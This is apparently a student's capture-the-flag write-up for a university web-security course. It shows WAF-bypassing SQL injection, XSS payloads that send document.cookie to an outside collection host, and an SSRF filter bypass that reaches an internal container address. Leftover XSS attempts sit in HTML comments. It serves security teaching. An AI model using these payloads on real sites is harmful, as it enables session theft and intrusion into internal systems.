---
title: "Course CTF: Week 9 & 10"
date: 2020-08-08T22:24:12+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

## Pay Portal v2

Site: pay-portal-v2.-QBSITE-

Sanitised strings:

* `#`
* `UNION`
* `SELECT`

Filtered filtered strings

* `payportal`
* `--`
* `OR ‎`

As both comment sequence characters are blocked (and `/*` doesn't work in this case) - we need to consider other ways to bypass the WAF.  

Upon investigation, the `OR ‎` is only filtered when that appended space character ` ` is present.  
We can therefore replace the space character with some other valid token - e.g a multiline comment `/**/`, or perhaps a bracket `(`

```
"OR(1);
```

> `COMP6443{WAF_IS_EASY_TO_BYPASS}`

## Flag Printer

Site: flagprinter.-QBSITE-

flagprinter.-QBSITE- does not verify the shared proxy secret, so we can create another endpoint that directs to the flagprinter domain.

> `COMP6443{I_AM_A_DOC_NOT_A_COP.ejUyMDY2Nzc=.sS6uqcz8pOufoVjSP7dVSg==}`

## Science Tomorrow

Site: science-tomorrow-v2.-QBSITE-

### Reflected

The WAF sanitises `img` and `onerror` keywords, and filters `fetch`.  
However it does not wholistically perform sanitisation (it performs only one round of sanitisation), which allows us to craft a bypass

```
<iimgmg src=a ononerrorerror=this.src="https://my.collection.site/?x="+document.cookie >
```

> `COMP6443{XSS_IS_TRIVIAL.ejUyMDY2Nzc=.zItJWqQjLsSpuM4L5QWJiA==}`


### Stored

Well.. uh no change from the [previous exploit](../week7/#stored-xss)...

```
<img src=a onerror=this.src="https://my.collection.site/?x="+document.cookie >
```

> `COMP6443{WAF_IS_TRIVIAL.ejUyMDY2Nzc=.S/wHijOgGLsxtWDrwDmUIQ==}`

---

## CTFProxy2 SSRF

Site: ctfproxy2.-QBSITE-/me  
Site: ctfproxy2.-QBSITE-/flag

Looking at the `robots.txt` file we gain knowledge of the page `/flag`.  
However, we cannot get the flag unless we are an 'internal' user.  

This will require some sort of SSRF or RCE...

In the `/me` page, we are able specify an address that the server will be used as the current user's avatar.  
The profile picture must follow a few rules, as specified by the WAF filter code

```python3
url = request.form.get("avatar", "")
if not url.endswith(".png"):
  flash("Avatar must be png file!", "danger")
  return redirect(url_for("me"))
try:
  blacklist = ['?', '127.', 'localhost', '0/', '::', '[', ']']
  for w in blacklist:
    if w in url:
      raise Exception("'%s' is dangerous" % w)
  try:
    domain = re.match(r"^https?://([a-zA-Z0-9-_.]+)", url).group(1)
  except IndexError:
    raise Exception("invalid url")
  ip = socket.gethostbyname(domain)
  if ipaddress.ip_address(unicode(ip)).is_private:
    raise Exception("it is forbidden to access internal server " + ip)
```

In English terms...

* Address must end with `.png`
* Address does **NOT** contain
  * `?`
  * `127.`
  * `localhost`
  * `0/`
  * `::`
  * `[`
  * `]`
* Match RE `https?://([a-zA-Z0-9-_.]+)`
  * Result capture group is not a private address


_So how do we bypass them?_

|Condition|Bypass|
|:--------|:-----|
|URL ends with `.png`|Append `#.png` to the URI|
|Address blacklist|Find alternate machine address|
|Regex Match|-|
|Non-Private Address|Add dummy address as a URI credential|

**Append `#.png` to the URI**  

Page anchors aren't considered part of a URI, and are not passed into the HTTP request - meaning they're ignored!  
For example, if I visited `www.google.com/somePage#test`, I would actually be visiting `www.google.com/somePage`

**Find alternate machine address**  

In the event that the capture group is resolved to a private address, an error appears which contains the IP address.  
This gives us another way to access the local machine (and ultimately the web server)

**Add dummy address as a URL credential**

A web URL usually follows the format `http(s)://website.com/path`

However, there are cases where we can also pass through `Basic` authentication.  
`http(s)://username:password@website.com/path`

The regex `https?://([a-zA-Z0-9-_.]+)` returns the first group of alphanumerical characters and/or `-_.`  
However this does not contain the `@` symbol.  

Therefore if we use `https://username:password@website.com/path`, the regex match will return `username:password`, rather than `website.com`.  
Since the matched group is then resolved, and checked if it is a private address - we need to pass some valid host that is public. Something like `https://google.com@website.com/path` would then return `google.com`, which resolves to a public address - bypassing the filter!

To suit the other criteria, we also need to append `#.png`  
This means that we now have a working WAF bypass technique.

```
# Template Payload
https://google.com@TARGET/PATH#.png
```

We can then ***try*** get the flag with the payload
```
https://google.com@ctfproxy2.-QBSITE-/flag#.png
```

***However***, we are presented with `HTTP Error 418: I'm a teapot` from the WAF / Reverse proxy.  
So we'll need to snoop around the internal company infrastructure to find other resources (Docker address of the `ctfproxy2` container!!!).

<!--
|Address|Result|
|:-----:|:----:|
|http://google.com@requestz.-QBSITE-#.png|https redirect|
|http://requestz.-QBSITE-#.png|10.152.183.138|
|http://google.com@10.152.183.138#.png|https redirect|
|https://google.com@10.152.183.138#.png|SSL error|
-->

<!--
|Address|Result|
|:-----:|:----:|
|https://requestz#.png|10.152.183.82|
|https://10.152.183.82#.png|10.152.183.82|
|https://google.com@10.152.183.82#.png|no conn|
|http://google.com@10.152.183.82#.png|no conn|
-->

|Address|Result|
|:------|:-----|
|`http://requestz.-QBSITE-#.png`|10.152.183.138|
|`http://ctfproxy2.-QBSITE-#.png`|10.152.183.138|
|`http://ctfproxy2#.png`|10.152.183.121|
|`https://google.com@10.152.183.121#.png`|No connection|
|`http://google.com@10.152.183.121#.png`|Page load|
|`http://google.com@10.152.183.121/flag#.png`|Flag!|

I first leaked the IP of `requestz.-QBSITE-` and `ctfproxy2.-QBSITE-`, which both returned the IP address `10.152.183.138`.  
This IP address is the address of the reverse proxy, not what we want.

Since the containers were on the same Docker network, they would be accessible from their machine host name too.  
By leaking the IP of `ctfproxy2`, we could get the IP address `10.152.183.121`.

We can now use our bypass payload to retrieve contents from that local server, and ultimately get the flag!

Note: The local server doesn't serve its content over HTTPS.  
This is quite a common practice in industry, as the reverse proxy will manage the SSL/TLS bits.

```
# Final Payload
http://google.com@10.152.183.121/flag#.png
```

> `COMP6443{SSRF_IS_FUN_AND_TRIVIAL_NOW_WITH_WAF.ejUyMDY2Nzc=.azX2IopdttJ8CONztQZWgw==}`

<!-- flagprinter-v2.-QBSITE-
https://flagprinter-v2#.png - 10.152.183.59
<iimgmg src=a ononerrorerror=this.src="https://ctfproxy2.-QBSITE-/api/flagprinter-v2" >
<iframe src="https://ctfproxy2.-QBSITE-/" onlonloadoad=fetch(this)></iframe>
<iframe src="https://-QBSITE-/" onlonloadoad=feonloadtch('https://flagprinter-v2.-QBSITE-/', {mode:'no-cors'})></iframe>
<iframe src="https://ctfproxy2.-QBSITE-/" onlonloadoad=feonloadtch('https://ctfproxy2.-QBSITE-/api/flagprinter-v2/')></iframe>
<iframe src="https://ctfproxy2.-QBSITE-/" onlonloadoad=function(){feonloadtch('https://ctfproxy2.-QBSITE-/api/flagprinter-v2/').then(r=>r.text()).then(console.log)></iframe>
username=testuser&password=testuser&confirm-password=testuser
username=testuser2 -->

